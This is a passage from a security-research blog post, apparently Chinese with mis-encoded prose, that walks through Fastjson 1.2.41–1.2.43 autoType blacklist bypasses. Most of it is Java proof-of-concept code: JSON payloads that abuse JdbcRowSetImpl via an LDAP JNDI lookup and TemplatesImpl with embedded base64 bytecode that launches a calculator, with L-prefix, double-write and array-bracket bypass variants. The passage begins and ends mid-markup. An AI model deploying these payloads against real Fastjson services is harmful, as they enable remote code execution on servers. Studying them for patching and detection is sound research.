</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;Lcom.sun.rowset.JdbcRowSetImpl;\&#34;,\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:2333/fupanc\&#34;,\&#34;autoCommit\&#34;:\&#34;true\&#34;}&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡ŒåæˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚</p>
<p>å¯¹åº”çš„TemplatesImplå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\&#34;,\&#34;_name\&#34;:\&#34;fupanc\&#34;,\&#34;_bytecodes\&#34;:[\&#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\&#34;],\&#34;_class\&#34;:null,\&#34;_tfactory\&#34;:{},\&#34;_outputProperties\&#34;:{}}&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">Feature</span><span class="p">.</span><span class="na">SupportNonPublicField</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>é‚£ä¹ˆå¯¹äº<strong>æ•°ç»„çš„å½¢å¼</strong>ï¼ŒJdbcRowSetImplçš„POCå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;[com.sun.rowset.JdbcRowSetImpl\&#34;[{,\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:2333/fupanc\&#34;,\&#34;autoCommit\&#34;:\&#34;true\&#34;}&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡ŒåæˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚</p>
<p>TemplatesImplå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&#34;[{,\&#34;_name\&#34;:\&#34;fupanc\&#34;,\&#34;_bytecodes\&#34;:[\&#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\&#34;],\&#34;_class\&#34;:null,\&#34;_tfactory\&#34;:{},\&#34;_outputProperties\&#34;:{}}&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">Feature</span><span class="p">.</span><span class="na">SupportNonPublicField</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åè°ƒè¯•ä¸€ä¸‹è¿‡ç¨‹å³å¯ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚</p>
<p>å±€é™æ€§è¿˜æ˜¯æŒºå¤§çš„ï¼Œè¿˜éœ€è¦â€œæ‰‹åŠ¨â€å°†autoTypeSupportè®¾ç½®ä¸ºtrueã€‚</p>
<h3 id="1242">1.2.42
</h3><p>xmlä¾èµ–çš„ç‰ˆæœ¬æ”¹æˆ1.2.42å³å¯ã€‚<strong>è¿™ä¸ªç‰ˆæœ¬ä¸‹ï¼Œæ•°ç»„çš„payloadè¿˜æ˜¯å¯ä»¥æ‰“</strong>ã€‚</p>
<p>ç”¨å‰é¢çš„JdbcRowSetImplé“¾æ¥çœ‹ä¸€ä¸‹ä¸»è¦çš„ä¸åŒç‚¹ï¼Œè¿˜æ˜¯è·Ÿè¿›è¿™é‡Œçš„checkAutoType()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413145318201.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413145318201"
	
	
></p>
<p>è¿™é‡Œéƒ½æ˜¯ä½¿ç”¨å“ˆå¸Œæ¥è®¡ç®—çš„ï¼Œè¿™é‡Œå¤§æ¦‚æ„æ€å°±æ˜¯çœ‹ç±»åå‰åæ˜¯å¦ä»¥<code>L</code>å¼€å¤´ï¼Œä»¥<code>;</code>ç»“å°¾ï¼Œæ˜¯çš„è¯å°±ä½¿ç”¨substring()æ–¹æ³•æ¥è¿›è¡Œæˆªå–ï¼Œç„¶åå†è¿›è¡Œåç»­çš„è°ƒç”¨ï¼Œç„¶åè¿™é‡Œçš„åˆ¤æ–­æ˜¯ç”¨çš„hashCodeï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413145737171.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413145737171"
	
	
></p>
<p>æ²¡æœ‰ä½¿ç”¨ä¹‹å‰çš„å­—æ¯çš„åå•ï¼ŒåŒæ—¶è¿™é‡Œæ˜¯è‚¯å®šä¼šè¢«banæ‰çš„ï¼Œç»è¿‡å¤„ç†åè‚¯å®šä¼šè¢«åŒ¹é…åˆ°é»‘åå•ä»è€Œæ‰”å‡ºå¼‚å¸¸ï¼Œç»•è¿‡æ–¹æ³•å°±æ˜¯å†åŠ ä¸€å±‚ï¼Œå› ä¸ºè¿™é‡ŒåªåŒ¹é…ä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯åªæˆªå–ä¸€æ¬¡ï¼Œè€Œä¸”TypeUtils.loadClass()æ–¹æ³•å¹¶æ²¡æœ‰ä»€ä¹ˆå˜åŒ–ï¼ŒåŒå†™ç»•è¿‡å³å¯ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;LLcom.sun.rowset.JdbcRowSetImpl;;\&#34;,\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:2333/fupanc\&#34;,\&#34;autoCommit\&#34;:\&#34;true\&#34;}&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>æ•°ç»„æ ¼å¼æ²¡æœ‰å½±å“ï¼Œç›´æ¥æ‰“å°±è¡Œäº†ï¼Œåªæœ‰<code>L</code>æ ¼å¼çš„ä½¿ç”¨åŒå†™ç»•è¿‡å³å¯</strong>ã€‚</p>
<p>ç®€å•è¯´è¯´è¿™é‡Œçš„<code>L</code>è¿‡ç¨‹ï¼Œå‰é¢è¿›è¡Œé»‘åå•çš„åˆ¤æ–­ï¼Œä¹Ÿæ˜¯å’Œå‰é¢åˆ†æçš„å·®ä¸å¤šçš„ï¼Œå°±æ˜¯ä¸å˜é‡autoTypeSupportä¸ºtrueæˆ–è€…falseï¼Œéƒ½ä¼šè¿›è¡Œä¸€æ¬¡ï¼Œä½†æ˜¯éƒ½ä¸åœ¨ç™½åå•ä¸­ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥åŠ è½½ï¼Œæœ€åè¿˜æ˜¯åœ¨å¦‚ä¸‹è¿›è¡ŒåŠ è½½çš„ï¼š
<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413151317839.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413151317839"
	
	
></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯ä¼ å…¥çš„å½¢å‚ä¼ é€’çš„å†…å®¹ï¼Œç„¶ååˆ¤æ–­æ˜¯æœ‰clazzæ˜¯å¦ä¸ºnullï¼Œè¿™é‡Œçœ‹ä¼¼å¯ä»¥ä¸ç”¨å†è°ƒç”¨<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true)</code>æ¥è¿›è¡Œè®¾ç½®å€¼ï¼Œå‰é¢æˆ‘ä»¬ä¹ŸçŸ¥é“ï¼Œè¿™é‡Œçš„autoTypeSupporté»˜è®¤ä¸ºfalseï¼Œåçœ‹æœ‰ä¸€ä¸ªé€»è¾‘æˆ‘ä»¬å¿…é¡»è®©è¿™ä¸ªå˜é‡ä¸ºtrueï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413152447169.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413152447169"
	
	
></p>
<p>åªæœ‰ä½trueæ‰èƒ½æ­£å¸¸è·å–åˆ°æƒ³è¦çš„ç±»ï¼Œä¸ç„¶å°±ä¼šæŠ¥å¼‚å¸¸ä»è€Œé€€å‡ºã€‚</p>
<p>ç„¶åå¯¹äº<code>TypeUtils.loadClass()</code>æ–¹æ³•å†…çš„å†…å®¹ï¼š
<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413152059466.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413152059466"
	
	
></p>
<p>å¯ä»¥çœ‹å‡ºæ¥æ˜¯ä¼šè°ƒç”¨ä¸‰æ¬¡è¿™ä¸ªloadClass()æ–¹æ³•æœ€åæ‰ä¼šæˆåŠŸåŠ è½½åˆ°ç±»ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413152003020.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413152003020"
	
	
></p>
<p>åé¢å°±æ˜¯ç†ŸçŸ¥çš„è¿‡ç¨‹äº†ï¼Œè¿™ä¸å¤šè¯´ã€‚</p>
<h3 id="1243">1.2.43
</h3><p>ä¾èµ–æ”¹ç‰ˆæœ¬ï¼Œç„¶åç›´æ¥å®šä½åˆ°ä¿®æ”¹çš„éƒ¨åˆ†ï¼Œè¿˜æ˜¯è·Ÿè¿›checkAutoType()æ–¹æ³•ï¼š
<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413154530007.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413154530007"
	
	
></p>
<p>é‡Œé¢åˆå¥—äº†ä¸€ä¸ªifæ¡ä»¶ï¼Œæ„æ€å°±æ˜¯å¦‚æœæ˜¯ä»¥<code>LL</code>å¼€å¤´ï¼Œé‚£ä¹ˆå°±ç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚</p>
<p>è¿™é‡Œçš„ç»•è¿‡æ–¹æ³•å°±æ˜¯å‰é¢çš„æ•°ç»„ï¼Œæ²¡é”™ï¼Œåˆ°è¿™ä¸ªç‰ˆæœ¬çš„æ•°ç»„æ ¼å¼è¿˜æ˜¯èƒ½æ‰“ï¼Œæœ€åçš„payloadå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;[com.sun.rowset.JdbcRowSetImpl\&#34;[{,\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:2333/fupanc\&#34;,\&#34;autoCommit\&#34;:\&#34;true\&#34;}&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>TemplatesImplå°±æ˜¯ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
